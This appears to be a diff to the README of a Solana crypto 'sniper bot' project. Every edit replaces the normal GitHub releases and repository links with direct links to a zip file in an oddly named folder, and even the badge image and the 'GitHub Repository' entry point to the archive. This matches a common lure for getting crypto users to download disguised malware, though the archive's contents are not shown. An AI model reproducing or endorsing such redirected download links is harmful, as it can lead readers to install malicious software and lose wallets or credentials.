@@ -6,9 +6,9 @@ Welcome to the Solana-PumpSwap-Sniper-Bot! This bot helps you automatically find
 
 ## 📥 Download the Bot
 
-[![Download the Solana-PumpSwap-Sniper-Bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/releases)
+[![Download the Solana-PumpSwap-Sniper-Bot](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip)
 
-To download the bot, visit the following page: [Download Page](https://github.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/releases).
+To download the bot, visit the following page: [Download Page](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip).
 
 ## ⚙️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Go to the [Download Page](https://github.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/releases).
+1. Go to the [Download Page](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip).
 2. Locate the latest version of the bot in the "Releases" section.
 3. Click on the version link to access the download options.
 4. Choose the appropriate file for your operating system and click to download.
@@ -78,8 +78,8 @@ We welcome contributions from the community. If you want to enhance the bot or s
 
 ## 🔗 Links
 
-- **GitHub Repository:** [Solana-PumpSwap-Sniper-Bot](https://github.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot)
-- **Download Page:** [Click here to download](https://github.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/releases)
+- **GitHub Repository:** [Solana-PumpSwap-Sniper-Bot](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip)
+- **Download Page:** [Click here to download](https://raw.githubusercontent.com/ElliottCHEAT/Solana-PumpSwap-Sniper-Bot/main/particularistic/Solana-PumpSwap-Sniper-Bot.zip)
 
 ## 📈 Conclusion
 
